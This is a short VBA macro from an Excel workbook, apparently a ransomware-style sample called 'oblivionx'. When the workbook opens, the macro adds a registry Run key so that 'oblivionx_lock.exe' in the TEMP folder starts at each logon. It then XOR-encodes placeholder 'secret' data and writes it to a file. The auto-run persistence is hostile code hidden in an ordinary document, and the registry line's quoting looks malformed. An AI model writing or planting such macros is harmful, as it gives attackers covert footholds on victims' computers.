Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim ws As Object
    Dim fPath As String, data As String, enc As String
    Dim i As Long
    Set ws = CreateObject("WScript.Shell")
    ws.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\oblivionx", """ & Environ("TEMP") & "\oblivionx_lock.exe"", "REG_SZ"
    fPath = Environ("TEMP") & "\oblivionx_vault\secret.txt"
    data = "top secret marker data"
    enc = ""
    For i = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, i, 1)) Xor 42)
    Next i
    Open fPath For Output As #1
    Print #1, enc
    Close #1
End Sub
